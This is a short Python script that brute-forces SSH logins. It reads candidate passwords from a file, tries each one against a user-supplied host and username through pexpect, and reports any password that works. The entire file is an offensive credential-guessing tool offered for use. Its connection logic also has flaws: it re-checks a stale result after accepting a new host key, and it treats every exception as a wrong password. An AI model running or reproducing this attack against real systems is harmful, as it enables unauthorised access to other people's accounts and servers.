#!/usr/bin/python3

import pexpect
from termcolor import colored

PROMPT = ['# ', '>>> ', '>> ', '> ', '\$ ', '~ ']

def connect(host, user, passwd):

    ssh_newkey = 'Are you sure you want to continue connecting? '
    connstr = 'ssh ' + user + '@' + host
    child = pexpect.spawn(connstr)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey,'[P|p]assword: '])

    if ret == 0:

        print('[-] Error connecting')
        return

    if ret == 1:

        child.sendline('yes')

        if ret == 0: 
           print('[-] Error connecting')
           return

    child.sendline(passwd)
    child.expect(PROMPT, timeout=0.5) 
    return child

def main():

    host = input('Enter a host: ')
    user = input('Enter a username: ')

    f = open('common_pass.txt', 'r')

    for passwd in f.readlines():

        passwd = passwd.strip('\n')

        try: 
            child = connect(host, user, passwd) 
            print(colored('[+] Password Found: ' + passwd, 'green'))

        except:
            print(colored('[-] Wrong Password: ' + passwd, 'red')) 
main()
